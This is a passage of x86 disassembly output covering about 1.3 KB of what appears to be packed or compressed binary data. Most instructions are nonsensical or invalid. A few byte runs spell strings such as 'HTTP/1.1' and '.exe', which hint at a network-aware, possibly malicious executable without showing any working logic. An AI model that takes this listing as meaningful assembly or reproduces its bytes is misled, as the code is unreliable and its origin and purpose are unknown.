  42c083:	1d 42 3f 55 01       	sbb    $0x1553f42,%eax
  42c088:	72 95                	jb     0x42c01f
  42c08a:	5f                   	pop    %edi
  42c08b:	a0 fb 37 27 5a       	mov    0x5a2737fb,%al
  42c090:	4b                   	dec    %ebx
  42c091:	6f                   	outsl  %ds:(%esi),(%dx)
  42c092:	65 74 69             	gs je  0x42c0fe
  42c095:	75 0d                	jne    0x42c0a4
  42c097:	5a                   	pop    %edx
  42c098:	46                   	inc    %esi
  42c099:	68 62 69 71 ed       	push   $0xed716962
  42c09e:	b7 6f                	mov    $0x6f,%bh
  42c0a0:	ed                   	in     (%dx),%eax
  42c0a1:	75 5a                	jne    0x42c0fd
  42c0a3:	45                   	inc    %ebp
  42c0a4:	53                   	push   %ebx
  42c0a5:	17                   	pop    %ss
  42c0a6:	68 72 50 63 36       	push   $0x36635072
  42c0ab:	6f                   	outsl  %ds:(%esi),(%dx)
  42c0ac:	69 68 5a 54 b2 ff 8f 	imul   $0x8fffb254,0x5a(%eax),%ebp
  42c0b3:	77 b7                	ja     0x42c06c
  42c0b5:	5a                   	pop    %edx
  42c0b6:	2f                   	das
  42c0b7:	49                   	dec    %ecx
  42c0b8:	6d                   	insl   (%dx),%es:(%edi)
  42c0b9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42c0ba:	50                   	push   %eax
  42c0bb:	61                   	popa
  42c0bc:	74 68                	je     0x42c126
  42c0be:	03 5b 51             	add    0x51(%ebx),%ebx
  42c0c1:	56                   	push   %esi
  42c0c2:	47                   	inc    %edi
  42c0c3:	4f                   	dec    %edi
  42c0c4:	5e                   	pop    %esi
  42c0c5:	41                   	inc    %ecx
  42c0c6:	77 a3                	ja     0x42c06b
  42c0c8:	6d                   	insl   (%dx),%es:(%edi)
  42c0c9:	0d c7 70 70 2f       	or     $0x2f7070c7,%eax
  42c0ce:	1d 03 70 8c 01       	sbb    $0x18c7003,%eax
  42c0d3:	a2 6d 85 ad 5e       	mov    %al,0x5ead856d
  42c0d8:	03 70 5e             	add    0x5e(%eax),%esi
  42c0db:	27                   	daa
  42c0dc:	71 08                	jno    0x42c0e6
  42c0de:	c3                   	ret
  42c0df:	fe                   	(bad)
  42c0e0:	1f                   	pop    %ds
  42c0e1:	de 7a 67             	fidivrs 0x67(%edx)
  42c0e4:	66 77 05             	data16 ja 0x42c0ec
  42c0e7:	22 25 31 22 20 25    	and    0x25202231,%ah
  42c0ed:	2a 00                	sub    (%eax),%al
  42c0ef:	20 08                	and    %cl,(%eax)
  42c0f1:	68 37 b6 70 00       	push   $0x70b637
  42c0f6:	fb                   	sti
  42c0f7:	7e 60                	jle    0x42c159
  42c0f9:	6f                   	outsl  %ds:(%esi),(%dx)
  42c0fa:	6a 7b                	push   $0x7b
  42c0fc:	6e                   	outsb  %ds:(%esi),(%dx)
  42c0fd:	85 96 b6 d3 63 ca    	test   %edx,-0x359c2c4a(%esi)
  42c103:	5a                   	pop    %edx
  42c104:	8f                   	(bad)
  42c105:	6d                   	insl   (%dx),%es:(%edi)
  42c106:	5a                   	pop    %edx
  42c107:	65 56                	gs push %esi
  42c109:	fb                   	sti
  42c10a:	dd 16                	fstl   (%esi)
  42c10c:	ec                   	in     (%dx),%al
  42c10d:	6b d7 62             	imul   $0x62,%edi,%edx
  42c110:	5a                   	pop    %edx
  42c111:	1f                   	pop    %ds
  42c112:	57                   	push   %edi
  42c113:	7d 59                	jge    0x42c16e
  42c115:	25 da cc 85 c6       	and    $0xc685ccda,%eax
  42c11a:	40                   	inc    %eax
  42c11b:	16                   	push   %ss
  42c11c:	1b 00                	sbb    (%eax),%eax
  42c11e:	5c                   	pop    %esp
  42c11f:	7a 6e                	jp     0x42c18f
  42c121:	3f                   	aas
  42c122:	6c                   	insb   (%dx),%es:(%edi)
  42c123:	73 df                	jae    0x42c104
  42c125:	2c 2e                	sub    $0x2e,%al
  42c127:	70 68                	jo     0x42c191
  42c129:	70 0b                	jo     0x42c136
  42c12b:	08 74 0a 00          	or     %dh,0x0(%edx,%ecx,1)
  42c12f:	76 62                	jbe    0x42c193
  42c131:	73 b7                	jae    0x42c0ea
  42c133:	6f                   	outsl  %ds:(%esi),(%dx)
  42c134:	74 23                	je     0x42c159
  42c136:	3f                   	aas
  42c137:	0b 3c 4d 72 6d 20 6d 	or     0x6d206d72(,%ecx,2),%edi
  42c13e:	cb                   	lret
  42c13f:	68 6f 52 ae 71       	push   $0x71ae526f
  42c144:	c2 64 3d             	ret    $0x3d64
  42c147:	bf 66 d1 b7 f8       	mov    $0xf8b7d166,%edi
  42c14c:	dd f8                	(bad)
  42c14e:	6b ff 58             	imul   $0x58,%edi,%edi
  42c151:	5f                   	pop    %edi
  42c152:	5e                   	pop    %esi
  42c153:	4f                   	dec    %edi
  42c154:	58                   	pop    %eax
  42c155:	44                   	inc    %esp
  42c156:	4b                   	dec    %ebx
  42c157:	b1 33                	mov    $0x33,%cl
  42c159:	5e                   	pop    %esi
  42c15a:	71 7b                	jno    0x42c1d7
  42c15c:	72 67                	jb     0x42c1c5
  42c15e:	6f                   	outsl  %ds:(%esi),(%dx)
  42c15f:	37                   	aaa
  42c160:	6e                   	outsb  %ds:(%esi),(%dx)
  42c161:	ff 2b                	ljmp   *(%ebx)
  42c163:	0c 67                	or     $0x67,%al
  42c165:	51                   	push   %ecx
  42c166:	47                   	inc    %edi
  42c167:	50                   	push   %eax
  42c168:	52                   	push   %edx
  42c169:	50                   	push   %eax
  42c16a:	4d                   	dec    %ebp
  42c16b:	1a 4e 47             	sbb    0x47(%esi),%cl
  42c16e:	46                   	inc    %esi
  42c16f:	4f                   	dec    %edi
  42c170:	6c                   	insb   (%dx),%es:(%edi)
  42c171:	fe                   	(bad)
  42c172:	ad                   	lods   %ds:(%esi),%eax
  42c173:	b6 d5                	mov    $0xd5,%dh
  42c175:	60                   	pusha
  42c176:	62 48 50             	bound  %ecx,0x50(%eax)
  42c179:	b5 73                	mov    $0x73,%ch
  42c17b:	6d                   	insl   (%dx),%es:(%edi)
  42c17c:	64 70 5f             	fs jo  0x42c1de
  42c17f:	42                   	inc    %edx
  42c180:	73 73                	jae    0x42c1f5
  42c182:	db 2e                	fldt   (%esi)
  42c184:	b4 d6                	mov    $0xd6,%ah
  42c186:	a1 11 0c 67 23       	mov    0x23670c11,%eax
  42c18b:	47                   	inc    %edi
  42c18c:	06                   	push   %es
  42c18d:	62 3b                	bound  %edi,(%ebx)
  42c18f:	ed                   	in     (%dx),%eax
  42c190:	5a                   	pop    %edx
  42c191:	bb 10 b0 6b 74       	mov    $0x746bb010,%ebx
  42c196:	e2 de                	loop   0x42c176
  42c198:	0b 58 48             	or     0x48(%eax),%ebx
  42c19b:	7d 6b                	jge    0x42c208
  42c19d:	85 be ae 65 68 24    	test   %edi,0x246865ae(%esi)
  42c1a3:	57                   	push   %edi
  42c1a4:	dc fb                	fdivr  %st,%st(3)
  42c1a6:	c9                   	leave
  42c1a7:	77 58                	ja     0x42c201
  42c1a9:	45                   	inc    %ebp
  42c1aa:	74 bf                	je     0x42c16b
  42c1ac:	db b7 b6 79 6d 11    	(bad) 0x116d79b6(%edi)
  42c1b2:	0c 6b                	or     $0x6b,%al
  42c1b4:	6a 24                	push   $0x24
  42c1b6:	40                   	inc    %eax
  42c1b7:	06                   	push   %es
  42c1b8:	65 58                	gs pop %eax
  42c1ba:	2f                   	das
  42c1bb:	77 72                	ja     0x42c22f
  42c1bd:	75 09                	jne    0x42c1c8
  42c1bf:	73 db                	jae    0x42c19c
  42c1c1:	66 63 6c 2c 04       	arpl   %bp,0x4(%esp,%ebp,1)
  42c1c6:	3b 82 72 ef 6d cd    	cmp    -0x3292108e(%edx),%eax
  42c1cc:	35 7f 2c 07 17       	xor    $0x17072c7f,%eax
  42c1d1:	b6 70                	mov    $0x70,%dh
  42c1d3:	20 5f 30             	and    %bl,0x30(%edi)
  42c1d6:	fb                   	sti
  42c1d7:	82 7d 0b 30          	cmpb   $0x30,0xb(%ebp)
  42c1db:	0c 0b                	or     $0xb,%al
  42c1dd:	31 0c fe             	xor    %ecx,(%esi,%edi,8)
  42c1e0:	c8 7f ef 03          	enter  $0xef7f,$0x3
  42c1e4:	03 2b                	add    (%ebx),%ebp
  42c1e6:	78 2c                	js     0x42c214
  42c1e8:	76 6f                	jbe    0x42c259
  42c1ea:	72 70                	jb     0x42c25c
  42c1ec:	36 31 73 31          	xor    %esi,%ss:0x31(%ebx)
  42c1f0:	36 fa                	ss cli
  42c1f2:	7f ef                	jg     0x42c1e3
  42c1f4:	c5 0e                	lds    (%esi),%ecx
  42c1f6:	9d                   	popf
  42c1f7:	03 23                	add    (%ebx),%esp
  42c1f9:	7e 33                	jle    0x42c22e
  42c1fb:	31 33                	xor    %esi,(%ebx)
  42c1fd:	32 34 2e             	xor    (%esi,%ebp,1),%dh
  42c200:	74 15                	je     0x42c217
  42c202:	86 1d 56 52 0f 32    	xchg   %bl,0x320f5256
  42c208:	0e                   	push   %cs
  42c209:	ff 6e 7f             	ljmp   *0x7f(%esi)
  42c20c:	27                   	daa
  42c20d:	d3 03                	roll   %cl,(%ebx)
  42c20f:	20 13                	and    %dl,(%ebx)
  42c211:	2f                   	das
  42c212:	26 76 3d             	es jbe 0x42c252
  42c215:	03 73 3d             	add    0x3d(%ebx),%esi
  42c218:	37                   	aaa
  42c219:	6e                   	outsb  %ds:(%esi),(%dx)
  42c21a:	38 c4                	cmp    %al,%ah
  42c21c:	0f c5 cc 2f          	pextrw $0x2f,%mm4,%ecx
  42c220:	56                   	push   %esi
  42c221:	7b d4                	jnp    0x42c1f7
  42c223:	38 22                	cmp    %ah,(%edx)
  42c225:	a2 6d 4b 5b 3e       	mov    %al,0x3e5b4b6d
  42c22a:	72 7e                	jb     0x42c2aa
  42c22c:	61                   	popa
  42c22d:	7b 6b                	jnp    0x42c29a
  42c22f:	15 b6 70 bb 5d       	adc    $0x5dbb70b6,%eax
  42c234:	4a                   	dec    %edx
  42c235:	2f                   	das
  42c236:	75 00                	jne    0x42c238
  42c238:	2f                   	das
  42c239:	64 41                	fs inc %ecx
  42c23b:	6f                   	outsl  %ds:(%esi),(%dx)
  42c23c:	2f                   	das
  42c23d:	96                   	xchg   %eax,%esi
  42c23e:	6e                   	outsb  %ds:(%esi),(%dx)
  42c23f:	23 7b 94             	and    -0x6c(%ebx),%edi
  42c242:	1a a5 8b 80 48 64    	sbb    0x6448808b(%ebp),%ah
  42c248:	03 fa                	add    %edx,%edi
  42c24a:	7f a1                	jg     0x42c1ed
  42c24c:	f1                   	int1
  42c24d:	50                   	push   %eax
  42c24e:	4f                   	dec    %edi
  42c24f:	9b                   	fwait
  42c250:	d6                   	salc
  42c251:	73 20                	jae    0x42c273
  42c253:	48                   	dec    %eax
  42c254:	54                   	push   %esp
  42c255:	54                   	push   %esp
  42c256:	50                   	push   %eax
  42c257:	2f                   	das
  42c258:	31 2e                	xor    %ebp,(%esi)
  42c25a:	31 0d e3 e6 36 36    	xor    %ecx,0x3636e6e3
  42c260:	f0 6f                	lock outsl %ds:(%esi),(%dx)
  42c262:	3f                   	aas
  42c263:	3a 12                	cmp    (%edx),%dl
  42c265:	09 43 6f             	or     %eax,0x6f(%ebx)
  42c268:	79 19                	jns    0x42c283
  42c26a:	5a                   	pop    %edx
  42c26b:	e1 6d                	loope  0x42c2da
  42c26d:	65 02 2d 54 79 0f 11 	add    %gs:0x110f7954,%ch
  42c274:	29 7d 6b             	sub    %edi,0x6b(%ebp)
  42c277:	34 2a                	xor    $0x2a,%al
  42c279:	5b                   	pop    %ebx
  42c27a:	f5                   	cmc
  42c27b:	6c                   	insb   (%dx),%es:(%edi)
  42c27c:	15 2f 78 2d 77       	adc    $0x772d782f,%eax
  42c281:	5d                   	pop    %ebp
  42c282:	d8 fe                	fdivr  %st(6),%st
  42c284:	b0 00                	mov    $0x0,%al
  42c286:	2d b2 2d 75 72       	sub    $0x72752db2,%eax
  42c28b:	6c                   	insb   (%dx),%es:(%edi)
  42c28c:	23 63 b4             	and    -0x4c(%ebx),%esp
  42c28f:	65 64 39 b7 e1 96 30 	gs cmp %esi,%fs:0x113096e1(%edi)
  42c296:	11 
  42c297:	9a 68 44 13 42 db 75 	lcall  $0x75db,$0x42134468
  42c29e:	ad                   	lods   %ds:(%esi),%eax
  42c29f:	01 4a 67             	add    %ecx,0x67(%edx)
  42c2a2:	0a 03                	or     (%ebx),%al
  42c2a4:	23 3a                	and    (%edx),%edi
  42c2a6:	d1 6a 59             	shrl   $1,0x59(%edx)
  42c2a9:	eb 52                	jmp    0x42c2fd
  42c2ab:	ae                   	scas   %es:(%edi),%al
  42c2ac:	2d a8 2c 67 98       	sub    $0x98672ca8,%eax
  42c2b1:	0b 05 1b 63 21 ea    	or     0xea21631b,%eax
  42c2b7:	64 e7 59             	fs out %eax,$0x59
  42c2ba:	10 2a                	adc    %ch,(%edx)
  42c2bc:	35 1c ed cf 36       	xor    $0x36cfed1c,%eax
  42c2c1:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42c2c2:	84 bd 9c 06 d6 f5    	test   %bh,-0xa29f964(%ebp)
  42c2c8:	c1 a7 3f 38 9b dd 68 	shll   $0x68,-0x2264c7c1(%edi)
  42c2cf:	ad                   	lods   %ds:(%esi),%eax
  42c2d0:	2d ab 22 c7 66       	sub    $0x66c722ab,%eax
  42c2d5:	19 95 4a 49 1a bf    	sbb    %edx,-0x40e5b6b6(%ebp)
  42c2db:	d1 28                	shrl   $1,(%eax)
  42c2dd:	64 b2 07             	fs mov $0x7,%dl
  42c2e0:	56                   	push   %esi
  42c2e1:	55                   	push   %ebp
  42c2e2:	43                   	inc    %ebx
  42c2e3:	50                   	push   %eax
  42c2e4:	47                   	inc    %edi
  42c2e5:	2b 92 ab bc d1 f8    	sub    -0x72e4355(%edx),%edx
  42c2eb:	ce                   	into
  42c2ec:	71 6d                	jno    0x42c35b
  42c2ee:	64 ff aa 35 18 0e e3 	ljmp   *%fs:-0x1cf1e7cb(%edx)
  42c2f5:	75 71                	jne    0x42c368
  42c2f7:	e8 54 be 10 5e       	call   0x5e538150
  42c2fc:	e6 de                	out    %al,$0xde
  42c2fe:	5a                   	pop    %edx
  42c2ff:	a1 51 1c 4a 0c       	mov    0xc4a1c51,%eax
  42c304:	5e                   	pop    %esi
  42c305:	40                   	inc    %eax
  42c306:	70 1d                	jo     0x42c325
  42c308:	07                   	pop    %es
  42c309:	6a ad                	push   $0xffffffad
  42c30b:	ba ed 22 4a 47       	mov    $0x474a22ed,%edx
  42c310:	72 06                	jb     0x42c318
  42c312:	4d                   	dec    %ebp
  42c313:	48                   	dec    %eax
  42c314:	6a d6                	push   $0xffffffd6
  42c316:	36 6d                	ss insl (%dx),%es:(%edi)
  42c318:	b4 5b                	mov    $0x5b,%ah
  42c31a:	e9 2d 61 45 78       	jmp    0x7888244c
  42c31f:	ed                   	in     (%dx),%eax
  42c320:	de 8b fc f5 a5 75    	fimuls 0x75a5f5fc(%ebx)
  42c326:	2e 65 78 65          	cs js,pn 0x42c38f
  42c32a:	0b 53 68             	or     0x68(%ebx),%edx
  42c32d:	65 66 73 23          	gs data16 jae 0x42c354
  42c331:	fb                   	sti
  42c332:	0a 22                	or     (%edx),%ah
  42c334:	4c                   	dec    %esp
  42c335:	56                   	push   %esi
  42c336:	69 19 69 2a 18 68    	imul   $0x68182a69,(%ecx),%ebx
  42c33c:	6e                   	outsb  %ds:(%esi),(%dx)
  42c33d:	65 08 37             	or     %dh,%gs:(%edi)
  42c340:	9a 1c 45 76 38 56 a6 	lcall  $0xa656,$0x3876451c
  42c347:	4e                   	dec    %esi
  42c348:	55                   	push   %ebp
  42c349:	49                   	dec    %ecx
  42c34a:	63 4b ae             	arpl   %ecx,-0x52(%ebx)
  42c34d:	af                   	scas   %es:(%edi),%eax
  42c34e:	eb 75                	jmp    0x42c3c5
  42c350:	5c                   	pop    %esp
  42c351:	0e                   	push   %cs
  42c352:	82 74 4d 2c 0b       	xorb   $0xb,0x2c(%ebp,%ecx,2)
  42c357:	21 50 d6             	and    %edx,-0x2a(%eax)
  42c35a:	74 0e                	je     0x42c36a
  42c35c:	49                   	dec    %ecx
  42c35d:	00 9f 4f ec 50 18    	add    %bl,0x1850ec4f(%edi)
  42c363:	28 50 95             	sub    %dl,-0x6b(%eax)
  42c366:	33 43 c8             	xor    -0x38(%ebx),%eax
  42c369:	56                   	push   %esi
  42c36a:	25 8f 41 57 87       	and    $0x8757418f,%eax
  42c36f:	12 64 0b ac          	adc    -0x54(%ebx,%ecx,1),%ah
  42c373:	c5 66 84             	lds    -0x7c(%esi),%esp
  42c376:	6d                   	insl   (%dx),%es:(%edi)
  42c377:	38 36                	cmp    %dh,(%esi)
  42c379:	1e                   	push   %ds
  42c37a:	43                   	inc    %ebx
  42c37b:	5b                   	pop    %ebx
  42c37c:	b1 5d                	mov    $0x5d,%cl
  42c37e:	b5 bf                	mov    $0xbf,%ch
  42c380:	6e                   	outsb  %ds:(%esi),(%dx)
  42c381:	ab                   	stos   %eax,%es:(%edi)
  42c382:	75 eb                	jne    0x42c36f
  42c384:	28 2b                	sub    %ch,(%ebx)
  42c386:	f8                   	clc
  42c387:	27                   	daa
  42c388:	0a 27                	or     (%edi),%ah
  42c38a:	20 d0                	and    %dl,%al
  42c38c:	50                   	push   %eax
  42c38d:	8e 02                	mov    (%edx),%es
  42c38f:	ef                   	out    %eax,(%dx)
  42c390:	59                   	pop    %ecx
  42c391:	0a 0a                	or     (%edx),%cl
  42c393:	0a 23                	or     (%ebx),%ah
  42c395:	7c 8e                	jl     0x42c325
  42c397:	eb 78                	jmp    0x42c411
  42c399:	0c 1a                	or     $0x1a,%al
  42c39b:	2e 5f                	cs pop %edi
  42c39d:	50                   	push   %eax
  42c39e:	53                   	push   %ebx
  42c39f:	74 2a                	je     0x42c3cb
  42c3a1:	43                   	inc    %ebx
  42c3a2:	02 5b 85             	add    -0x7b(%ebx),%bl
  42c3a5:	c2 52 1c             	ret    $0x1c52
  42c3a8:	65 87 d9             	gs xchg %ebx,%ecx
  42c3ab:	ee                   	out    %al,(%dx)
  42c3ac:	63 4f 8d             	arpl   %ecx,-0x73(%edi)
  42c3af:	ee                   	out    %al,(%dx)
  42c3b0:	18 33                	sbb    %dh,(%ebx)
  42c3b2:	25 78 03 77 fd       	and    $0xfd770378,%eax
  42c3b7:	00 62 7f             	add    %ah,0x7f(%edx)
  42c3ba:	20 fb                	and    %bh,%bl
  42c3bc:	fe                   	(bad)
  42c3bd:	39 38                	cmp    %edi,(%eax)
  42c3bf:	31 39                	xor    %edi,(%ecx)
  42c3c1:	63 35 32 17 2c 03    	arpl   %esi,0x32c1732
  42c3c7:	4d                   	dec    %ebp
  42c3c8:	53                   	push   %ebx
  42c3c9:	4e                   	dec    %esi
  42c3ca:	00 35 65 5f c0 be    	add    %dh,0xbec05f65
  42c3d0:	db 37                	(bad) (%edi)
  42c3d2:	65 2d 30 30 2b 3a    	gs sub $0x3a2b3030,%eax
  42c3d8:	03 83 5f 6f d0 ea    	add    -0x152f90a1(%ebx),%eax
  42c3de:	da 73 69             	fidivl 0x69(%ebx)
  42c3e1:	64 4f                	fs dec %edi
  42c3e3:	65 3b 31             	cmp    %gs:(%ecx),%esi
  42c3e6:	35 35 61 95 5a       	xor    $0x5a956135,%eax
  42c3eb:	c7                   	(bad)
  42c3ec:	18 9b 74 0d 67 79    	sbb    %bl,0x79670d74(%ebx)
  42c3f2:	83 dd 9a             	sbb    $0xffffff9a,%ebp
  42c3f5:	6c                   	insb   (%dx),%es:(%edi)
  42c3f6:	b6 70                	mov    $0x70,%dh
  42c3f8:	3a 0c 07             	cmp    (%edi,%eax,1),%cl
  42c3fb:	68 d7 70 3a d2       	push   $0xd23a70d7
  42c400:	07                   	pop    %es
  42c401:	ee                   	out    %al,(%dx)
  42c402:	33 e8                	xor    %eax,%ebp
  42c404:	07                   	pop    %es
  42c405:	73 08                	jae    0x42c40f
  42c407:	43                   	inc    %ebx
  42c408:	5f                   	pop    %edi
  42c409:	ae                   	scas   %es:(%edi),%al
  42c40a:	0b 59 2b             	or     0x2b(%ecx),%ebx
  42c40d:	b5 bb                	mov    $0xbb,%ch
  42c40f:	a3 47 7b 1b 0c       	mov    %eax,0xc1b7b47
  42c414:	1c bc                	sbb    $0xbc,%al
  42c416:	09 5f 6d             	or     %ebx,0x6d(%edi)
  42c419:	eb 70                	jmp    0x42c48b
  42c41b:	3b 52 81             	cmp    -0x7f(%edx),%edx
  42c41e:	dd c3                	ffree  %st(3)
  42c420:	3f                   	aas
  42c421:	69 98 ca 00 7c 03 2b 	imul   $0x364ecc2b,0x37c00ca(%eax),%ebx
  42c428:	cc 4e 36 
  42c42b:	13 26                	adc    (%esi),%esp
  42c42d:	6c                   	insb   (%dx),%es:(%edi)
  42c42e:	18 72 63             	sbb    %dh,0x63(%edx)
  42c431:	5d                   	pop    %ebp
  42c432:	cb                   	lret
  42c433:	bd 5e 1f e0 0a       	mov    $0xae01f5e,%ebp
  42c438:	98                   	cwtl
  42c439:	b7 26                	mov    $0x26,%bh
  42c43b:	c6                   	(bad)
  42c43c:	f7 4a 3c 72 3f 0c 0b 	testl  $0xb0c3f72,0x3c(%edx)
  42c443:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  42c445:	ae                   	scas   %es:(%edi),%al
  42c446:	d8 6c 83 1a          	fsubrs 0x1a(%ebx,%eax,4)
  42c44a:	6c                   	insb   (%dx),%es:(%edi)
  42c44b:	23 0a                	and    (%edx),%ecx
  42c44d:	bf 7b 0f da 7b       	mov    $0x7bda0f7b,%edi
  42c452:	17                   	pop    %ss
  42c453:	0f a0                	push   %fs
  42c455:	1d 0f 6f f6 1e       	sbb    $0x1ef66f0f,%eax
  42c45a:	ac                   	lods   %ds:(%esi),%al
  42c45b:	0b 31                	or     (%ecx),%esi
  42c45d:	f7 7a 33             	idivl  0x33(%edx)
  42c460:	73 8a                	jae    0x42c3ec
  42c462:	00 b7 78 fb 3f c0    	add    %dh,-0x3fc00488(%edi)
  42c468:	1e                   	push   %ds
  42c469:	6f                   	outsl  %ds:(%esi),(%dx)
  42c46a:	5a                   	pop    %edx
  42c46b:	b1 2d                	mov    $0x2d,%cl
  42c46d:	d0 11                	rclb   $1,(%ecx)
  42c46f:	8c 39                	mov    %?,(%ecx)
  42c471:	0a 4f d9             	or     -0x27(%edi),%cl
  42c474:	12 cb                	adc    %bl,%cl
  42c476:	3d 0b 47 00 fe       	cmp    $0xfe00470b,%eax
  42c47b:	ff                   	lcall  (bad)
  42c47c:	df 8f 54 1b 10 8e    	fisttps -0x71efe4ac(%edi)
  42c482:	65 08 00             	or     %al,%gs:(%eax)
  42c485:	2b 2b                	sub    (%ebx),%ebp
  42c487:	d1 19                	rcrl   $1,(%ecx)
  42c489:	d8 7f 83             	fdivrs -0x7d(%edi)
  42c48c:	2e 3f                	cs aas
  42c48e:	00 de                	add    %bl,%dh
  42c490:	4a                   	dec    %edx
  42c491:	df 41 56             	filds  0x56(%ecx)
  42c494:	d3 5f 22             	rcrl   %cl,0x22(%edi)
  42c497:	85 72 40             	test   %esi,0x40(%edx)
  42c49a:	40                   	inc    %eax
  42c49b:	74 1d                	je     0x42c4ba
  42c49d:	58                   	pop    %eax
  42c49e:	48                   	dec    %eax
  42c49f:	8f                   	(bad)
  42c4a0:	27                   	daa
  42c4a1:	74 e7                	je     0x42c48a
  42c4a3:	5f                   	pop    %edi
  42c4a4:	e6 6c                	out    %al,$0x6c
  42c4a6:	d7                   	xlat   %ds:(%ebx)
  42c4a7:	2a 34 d6             	sub    (%esi,%edx,8),%dh
  42c4aa:	26 01 00             	add    %eax,%es:(%eax)
  42c4ad:	00 ff                	add    %bh,%bh
  42c4af:	69 0e 73 db 5c 84    	imul   $0x845cdb73,(%esi),%ecx
  42c4b5:	23 62 03             	and    0x3(%edx),%esp
  42c4b8:	0f d8 de             	psubusb %mm6,%mm3
  42c4bb:	b9 bc e4 b6 10       	mov    $0x10b6e4bc,%ecx
  42c4c0:	80 17 31             	adcb   $0x31,(%edi)
  42c4c3:	b7 56                	mov    $0x56,%bh
  42c4c5:	b9 6a b9 b2 d9       	mov    $0xd9b2b96a,%ecx
  42c4ca:	c9                   	leave
  42c4cb:	66 58                	pop    %ax
  42c4cd:	76 b9                	jbe    0x42c488
  42c4cf:	58                   	pop    %eax
  42c4d0:	5f                   	pop    %edi
  42c4d1:	23 f9                	and    %ecx,%edi
  42c4d3:	02 76 58             	add    0x58(%esi),%dh
  42c4d6:	0b e0                	or     %eax,%esp
  42c4d8:	17                   	pop    %ss
  42c4d9:	13 01                	adc    (%ecx),%eax
  42c4db:	9c                   	pushf
  42c4dc:	8d 85 a4 f8 3b 80    	lea    -0x7fc4075c(%ebp),%eax
  42c4e2:	47                   	inc    %edi
  42c4e3:	80 b2 2b 39 84 28 80 	xorb   $0x80,0x2884392b(%edx)
  42c4ea:	40                   	inc    %eax
  42c4eb:	13 7f 3f             	adc    0x3f(%edi),%edi
  42c4ee:	d8 17                	fcoms  (%edi)
  42c4f0:	3b 48 13             	cmp    0x13(%eax),%ecx
  42c4f3:	55                   	push   %ebp
  42c4f4:	8b ec                	mov    %esp,%ebp
  42c4f6:	81 ec 25 8b 45 08    	sub    $0x8458b25,%esp
  42c4fc:	6f                   	outsl  %ds:(%esi),(%dx)
  42c4fd:	ff                   	ljmp   (bad)
  42c4fe:	ed                   	in     (%dx),%eax
  42c4ff:	e8 50 68 c8 6d       	call   0x6e0b2d54
  42c504:	8d 8d 50 51 ff 15    	lea    0x15ff5150(%ebp),%ecx
  42c50a:	a8 60                	test   $0x60,%al
  42c50c:	0c 83                	or     $0x83,%al
  42c50e:	c4 0c 64             	les    (%esp,%eiz,2),%ecx
  42c511:	7b ee                	jnp    0x42c501
  42c513:	df 8d 85 0f 8b e5    	fisttps -0x1a74f07b(%ebp)
  42c519:	5d                   	pop    %ebp
  42c51a:	c3                   	ret
  42c51b:	2b 25 19 ac e6 7e    	sub    0x7ee6ac19,%esp
  42c521:	7f 6c                	jg     0x42c58f
  42c523:	04 11                	add    $0x11,%al
  42c525:	83 ec 08             	sub    $0x8,%esp
  42c528:	c7 45 f8 4a 68 cc 3d 	movl   $0x3dcc684a,-0x8(%ebp)
  42c52f:	20 7b eb             	and    %bh,-0x15(%ebx)
  42c532:	3f                   	aas
  42c533:	72 bc                	jb     0x42c4f1
  42c535:	08 89 45 fc 83 7d    	or     %cl,0x7d83fc45(%ecx)
  42c53b:	fc                   	cld
  42c53c:	00 97 6a 02 6a 19    	add    %dl,0x196a026a(%edi)
  42c542:	64 fb                	fs sti
  42c544:	49                   	dec    %ecx
  42c545:	77 4d                	ja     0x42c594
  42c547:	fc                   	cld
  42c548:	54                   	push   %esp
  42c549:	b8 8b 55 fc 52       	mov    $0x52fc558b,%eax
  42c54e:	47                   	inc    %edi
  42c54f:	b4 9e                	mov    $0x9e,%ah
  42c551:	d6                   	salc
  42c552:	6c                   	insb   (%dx),%es:(%edi)
  42c553:	db 26                	(bad) (%esi)
  42c555:	f8                   	clc
  42c556:	36 fc                	ss cld
  42c558:	b0 0f                	mov    $0xf,%al
  42c55a:	8b 77 84             	mov    -0x7c(%edi),%esi
  42c55d:	7d 66                	jge    0x42c5c5
  42c55f:	6e                   	outsb  %ds:(%esi),(%dx)
  42c560:	51                   	push   %ecx
  42c561:	68 d0 53 14 4f       	push   $0x4f1453d0
  42c566:	6f                   	outsl  %ds:(%esi),(%dx)
  42c567:	f6 6f b2             	imulb  -0x4e(%edi)
  42c56a:	32 b8 e7 eb 02 33    	xor    0x3302ebe7(%eax),%bh
  42c570:	c0 38 95             	sarb   $0x95,(%eax)
  42c573:	75 cd                	jne    0x42c542
  42c575:	fd                   	std
  42c576:	bb 56 36 0f be       	mov    $0xbe0f3656,%ebx
  42c57b:	08 85 c9 0f 84 99    	or     %al,-0x667bf037(%ebp)
  42c581:	1c 71                	sbb    $0x71,%al
  42c583:	0d 02 e4 b6 0d       	or     $0xdb6e402,%eax
  42c588:	d2 64 c0 f0          	shlb   %cl,-0x10(%eax,%eax,8)
  42c58c:	40                   	inc    %eax
  42c58d:	0c 11                	or     $0x11,%al
  42c58f:	11 52 b6             	adc    %edx,-0x4a(%edx)
  42c592:	73 77                	jae    0x42c60b
  42c594:	9f                   	lahf
  42c595:	3b f0                	cmp    %eax,%esi
  42c597:	75 65                	jne    0x42c5fe
  42c599:	33 83 c0 01 63 1c    	xor    0x1c6301c0(%ebx),%eax
  42c59f:	83 c1 08             	add    $0x8,%ecx
  42c5a2:	b6 12                	mov    $0x12,%dh
  42c5a4:	9b                   	fwait
  42c5a5:	ed                   	in     (%dx),%eax
  42c5a6:	4d                   	dec    %ebp
  42c5a7:	f8                   	clc
  42c5a8:	37                   	aaa
  42c5a9:	f8                   	clc
  42c5aa:	85 c0                	test   %eax,%eax
  42c5ac:	03 2f                	add    (%edi),%ebp
  42c5ae:	f8                   	clc
  42c5af:	58                   	pop    %eax
  42c5b0:	d7                   	xlat   %ds:(%ebx)
  42c5b1:	5c                   	pop    %esp
  42c5b2:	42                   	inc    %edx
  42c5b3:	41                   	inc    %ecx
  42c5b4:	27                   	daa
  42c5b5:	61                   	popa
  42c5b6:	51                   	push   %ecx
  42c5b7:	41                   	inc    %ecx
  42c5b8:	67 6f                	outsl  %ds:(%si),(%dx)
  42c5ba:	db 1d 14 2f 83 c2    	fistpl 0xc2832f14
  42c5c0:	38 55 d2             	cmp    %dl,-0x2e(%ebp)
  42c5c3:	4a                   	dec    %edx
  42c5c4:	eb 3e                	jmp    0x42c604
  42c5c6:	6c                   	insb   (%dx),%es:(%edi)
